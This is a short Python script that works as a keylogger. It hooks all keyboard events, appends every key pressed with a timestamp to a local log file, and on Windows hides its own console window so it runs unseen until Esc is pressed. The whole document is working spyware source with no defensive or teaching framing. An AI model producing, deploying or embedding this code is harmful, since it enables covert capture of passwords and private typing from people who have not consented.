import keyboard
from datetime import datetime
import sys
import ctypes

# OPTIONAL: Hide console window (Windows only)
def hide_console():
    whnd = ctypes.windll.kernel32.GetConsoleWindow()
    if whnd != 0:
        ctypes.windll.user32.ShowWindow(whnd, 0)
        ctypes.windll.kernel32.CloseHandle(whnd)

if not hasattr(sys, 'ps1'):
    hide_console()

log_file = "key_log.txt"

def callback(event):
    # Only record when the key is pressed down (ignores key release events)
    if event.event_type == keyboard.KEY_DOWN:
        time_stamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        # 'event.name' automatically normalises keys (numpad '5' becomes '5')
        key_name = event.name
        
        # Optional formatting: wrap special keys like 'space' or 'enter' in brackets
        if len(key_name) > 1:
            key_data = f"{time_stamp} - [{key_name}]\n"
        else:
            key_data = f"{time_stamp} - {key_name}\n"
            
        with open(log_file, "a") as f:
            f.write(key_data)

# Register the callback function for all keyboard events
keyboard.hook(callback)

# Keep the script running until you press the 'esc' key
keyboard.wait('esc')
